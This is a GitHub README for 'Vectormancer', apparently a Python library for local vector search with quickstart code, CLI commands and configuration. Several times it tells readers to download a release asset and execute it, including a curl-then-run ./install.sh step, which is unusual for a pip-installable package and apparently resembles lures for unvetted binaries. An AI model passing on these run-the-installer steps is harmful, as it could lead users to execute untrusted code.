[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/TchubiruBR/vectormancer/releases)

# Vectormancer — Local Vector Search for Documents and Code

![Vectormancer illustration](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=80)

A compact Python toolkit for local vector search and semantic retrieval across documents, notes, and codebases. Vectormancer builds dense vector indexes, supports common embedding backends, and exposes a simple API and CLI for search, similarity, and semantic snippets.

- Language: Python 3.8+
- Focus: offline, local-first vector search
- Use cases: developer code search, knowledge base retrieval, semantic note linking, local semantic assistants

Badges
- PyPI, CI, license, coverage — add when you publish.
- Releases: visit the releases page to download assets and installers. Download the release file at https://github.com/TchubiruBR/vectormancer/releases and execute it if the asset is an installer.

Table of contents
- Features
- Why Vectormancer
- Concepts
- Install
- Quickstart
- Examples
  - Document search
  - Code search
  - Notes graph
- CLI
- Configuration
- Index internals
- Embeddings backends
- Performance tips
- Testing
- Contributing
- License
- Acknowledgements

Features
- Local vector index with persistent storage
- HNSW and IVF index options for ANN search
- Cosine, dot product, and Euclidean similarity
- Modular embedding backends: OpenAI, local models, sentence-transformers
- Chunking, deduplication, and metadata-aware indexing
- Query-time rerankers and snippet extraction
- Lightweight Python API and a command-line client
- Small memory footprint and pluggable storage (SQLite, LMDB, flat files)

Why Vectormancer
- Run search where your data lives. No cloud required.
- Integrate with code editors, note apps, or static sites.
- Control embeddings, indexing, and retrieval pipelines.
- Keep data private and version controlled.

Core concepts (short)
- Document: any text file, code file, or note.
- Chunk: split text segment that receives an embedding.
- Embedding: numeric vector representation of a chunk.
- Index: data structure that stores vectors and metadata for fast search.
- Retriever: module that executes a vector query and returns candidates.
- Reranker: optional module that scores or reorders results with a stronger model.

Install

From PyPI (when published)
```bash
pip install vectormancer
```

Install from a release asset
Download the release file from https://github.com/TchubiruBR/vectormancer/releases and execute it. Common patterns:
```bash
# example for a linux tarball release asset
curl -L -o vectormancer.tar.gz "https://github.com/TchubiruBR/vectormancer/releases/download/v1.0/vectormancer-1.0-linux.tar.gz"
tar -xzf vectormancer.tar.gz
./install.sh
```

Alternatively clone and install in editable mode
```bash
git clone https://github.com/TchubiruBR/vectormancer.git
cd vectormancer
pip install -e .
```

Quickstart

Index documents and run a semantic search in a few steps.

1) Create an index and add files
```python
from vectormancer import Index, FileLoader, EmbeddingBackend

emb = EmbeddingBackend("sentence-transformers/all-MiniLM-L6-v2")
loader = FileLoader("./docs")
index = Index("local-index.db", embedding=emb, method="hnsw")

for doc in loader.iter_files():
    index.add_document(doc.path, doc.text, metadata=doc.meta)

index.save()
```

2) Query the index
```python
from vectormancer import Index

index = Index.open("local-index.db")
results = index.search("How to configure the logger", top_k=10)

for r in results:
    print(r.score, r.metadata.get("path"), r.text[:200])
```

Examples

Document search
- Index a docs/ folder.
- Use chunk size 256 and stride 64 to keep passages coherent.
- Query with natural language to surface relevant passages.

Code search
- Use a code-aware chunker that splits on function boundaries.
- Store language and path metadata for context.
- Combine vector search with regex filters to narrow results by language or file path.

Notes graph
- Index personal notes with links and tags.
- Use vector similarity to suggest related notes.
- Build a local assistant that suggests follow-up notes when you write.

CLI

The project includes a command-line client for common flows.

Common commands
- vectormancer init --index myindex.db
- vectormancer add --path notes/ --chunk-size 300
- vectormancer search "semantic query" --top 5 --rerank

Example
```bash
vectormancer init --index myindex.db
vectormancer add --index myindex.db --dir ./repo --ext py,md
vectormancer search --index myindex.db "database connection pooling" --top 8
```

Configuration

Config file (YAML)
- index: path to index file
- embedding: backend name and options
- chunk_size: integer
- stride: integer
- method: hnsw | ivf | flat
- storage: sqlite | lmdb | dir

Example config
```yaml
index: data/vectormancer.db
embedding:
  backend: sentence-transformers/all-MiniLM-L6-v2
chunk_size: 256
stride: 64
method: hnsw
storage: sqlite
```

Index internals (technical)
- HNSW: navigable small world graph for fast approximate nearest neighbor search.
- IVFFlat: inverted file with coarse quantizer then exact search in clusters.
- Vector store: stores vectors in a compact binary blob and metadata in SQLite.
- Persisted shards: split index into shards for parallel search on large datasets.
- Serialization: use protocol buffers for metadata and efficient load.

Embeddings backends
- Local models: sentence-transformers, transformers with local GPU/CPU inference.
- Remote APIs: OpenAI, Cohere, Hugging Face Inference API.
- Custom: implement EmbeddingBackend interface, return float32 vectors and optionally token counts.

Reranking and hybrid scoring
- Use a reranker model for final scoring on the top-N candidates.
- Combine lexical score (BM25) and semantic score with a weighted sum.
- Expose a reranker hook to inject a transformer or custom scorer.

Performance tips
- Choose HNSW for latency-critical workloads.
- Use IVFFlat when indexing very large datasets and you accept higher recall tuning.
- Persist index on SSD for faster startup.
- Precompute and cache embeddings when possible.
- Use batch embedding calls to reduce model overhead.

Storage and backup
- The index lives in a SQLite file by default; it exports to a compact shard format.
- To backup: copy the index file or export to an archive.
- For reproducible builds: version the chunking settings and embedding model in your repository.

Security and privacy
- Run embedding models locally to keep text within your environment.
- Encrypt the index file at rest if you store sensitive data.
- Use local inference to avoid sending secrets to remote APIs.

Testing

Unit tests
- Run: pytest tests/
- Use small synthetic datasets to validate chunking, indexing, and retrieval.

Load tests
- Use vectormancer-bench (example tool) to stress the index with concurrent searches.

Contributing

Contributions follow a clear workflow:
- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Open a pull request and reference an issue.

Coding style
- Use black formatting and flake8 lint rules.
- Keep functions small and focused.
- Add type hints for public APIs.

Roadmap (sample)
- Multi-vector item support (code + doc embeddings)
- Vector quantization for smaller footprints
- Editor plugins for VS Code and Neovim
- A lightweight web UI for browsing search results

API reference (excerpt)

Index
- Index(path, embedding, method="hnsw", storage="sqlite")
- add_document(path: str, text: str, metadata: dict = None)
- search(query: str, top_k: int = 10) -> List[Result]
- save()
- close()

EmbeddingBackend
- encode(texts: List[str]) -> np.ndarray
- batch_size: int
- model_name: str

Result
- score: float
- text: str
- metadata: dict

Advanced: integrating with downstream apps
- Use search results to populate context windows for LLM prompts.
- Build a code assistant: combine vector search with AST parsing to present relevant functions and tests.
- Use the index as a knowledge layer for chatbots that run locally.

Assets and images
- Use diagrams to show indexing flow: chunk -> embed -> index -> query -> rerank.
- Use screenshots from your UI or CLI outputs in docs/ for onboarding.

Releases and download
- Visit the releases page to fetch installers and packaged assets: https://github.com/TchubiruBR/vectormancer/releases
- If the release provides an installer or binary asset, download and execute it per the platform instructions.

License
- MIT (change to your license of choice)

Acknowledgements
- Open-source embedding models and ANN libraries such as FAISS, hnswlib, and Annoy.
- Community contributions for chunkers and file loaders.

Contact
- Open issues on GitHub for bugs and feature requests.
- Submit PRs for fixes and enhancements.

Screenshots

![CLI search example](https://raw.githubusercontent.com/TchubiruBR/vectormancer/main/docs/assets/cli-search-example.png)

References and further reading
- Vector search primer: dense embeddings, ANN, and reranking
- HNSW paper: "Efficient and robust approximate nearest neighbor search using HNSW"
- Sentence-transformers models for compact embeddings

Examples folder
- examples/document_search.ipynb
- examples/code_search.py
- examples/notes_graph_demo.md

Keep the index configuration with your project. Use version control for your config and chunking rules to preserve search behavior across updates.